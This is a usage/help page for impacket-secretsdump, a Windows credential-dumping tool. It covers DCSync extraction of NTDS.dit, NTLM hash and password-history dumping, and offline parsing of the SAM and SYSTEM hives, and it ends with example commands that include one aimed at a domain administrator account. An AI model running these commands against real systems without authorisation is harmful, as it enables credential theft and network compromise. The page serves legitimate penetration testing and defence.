impacket-secretsdump v0.11.0 — Windows Credential Dumper

Usage: impacket-secretsdump [options] <target>

Target Formats:
  domain/user:password@ip
  domain/user@ip -hashes LM:NT

Remote Operations:
  -just-dc                  Dump NTDS.dit via DRS (DCSync)
  -just-dc-user <user>      Dump specific user from NTDS
  -just-dc-ntlm             Dump only NTLM hashes from NTDS
  -history                  Include password history
  -pwd-last-set             Include password last set timestamps
  -user-status              Include user account status
  -use-vss                  Use Volume Shadow Copy
  -resumefile <file>        Resume from partial dump

Local Operations:
  -sam <file>               SAM hive file
  -system <file>            SYSTEM hive file
  -security <file>          SECURITY hive file
  -ntds <file>              NTDS.dit file

Output:
  -outputfile <file>        Write output to file
  -ts                       Include timestamps in output

Debug:
  -debug                    Enable debug output

Other:
  -dc-ip <ip>               Domain controller IP
  -target-ip <ip>           Target IP address

Examples:
  impacket-secretsdump -just-dc-ntlm evilcorp.local/administrator:Pass123@10.10.10.1
  impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL
  impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
